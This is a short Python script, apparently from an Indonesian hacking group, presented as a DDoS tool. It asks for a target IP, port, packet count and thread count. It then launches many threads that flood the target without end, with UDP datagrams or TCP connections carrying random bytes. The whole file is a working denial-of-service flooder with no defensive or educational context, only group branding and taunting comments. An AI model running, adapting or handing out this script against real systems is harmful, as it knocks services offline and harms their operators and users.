#AUTHOR SIXNINESIX
#ngapain dek ngeliat
#yatim lu yang curi script
import random
import socket
import threading
import os
import sys

os.system("clear")
print ("TOOLS DDOS V1 BY HYDRA SEC")

ip = str(input(" IP TARGET :"))
port = int(input(" PORT :"))
choice = str(input(" YAKIN DI KIRIM PAKET?(y/n):"))
times = int(input(" PACKETS:"))
threads = int(input(" THREAD:"))
def attack():
	data = random._urandom(2800)
	i = random.choice(("[PACKETS!!]","[PACKETS!!]","[PACKETS!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PERMISI PACKETS DARI HYDRA SEC!!!")
		except:
			print("[!] BOOM!!!")

def attack2():
	data = random._urandom(1500)
	i = random.choice(("[PAKET!!]","[PAKET!!]","[PAKET!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PERMISI PACKETS DARI HYDRA SEC!!!")
		except:
			s.close()
			print("[*] BOOM")

def attack3():
	data = random._urandom(999)
	i = random.choice(("[PAKET!!]","[PAKET!!]","[PAKET!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PERMISI PACKETS DARI HYDRA SEC!!!")
		except:
			s.close()
			print("[*] BOOM")
  
def attack4():
	data = random._urandom(818)
	i = random.choice(("[PAKET!!]","[PAKET!!]","[PAKET!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PERMISI PACKETS DARI HYDRA SEC!!!")
		except:
			s.close()
			print("[*] BOOM")
  
def attack5():
	data = random._urandom(16)
	i = random.choice(("[PAKET!!]","[PAKET!!]","[PAKET!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PERMISI PACKETS DARI HYDRA SEC!!!")
		except:
			s.close()
			print("[*] BOOM")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = attack)
		th.start()
	else:
		th = threading.Thread(target = attack2)
		th.start()
		
		th = threading.Thread(target = attack3)
		th.start()
		
		th = threading.Thread(target = attack4)
		th.start()
		
		th = threading.Thread(target = attack5)
		th.start()
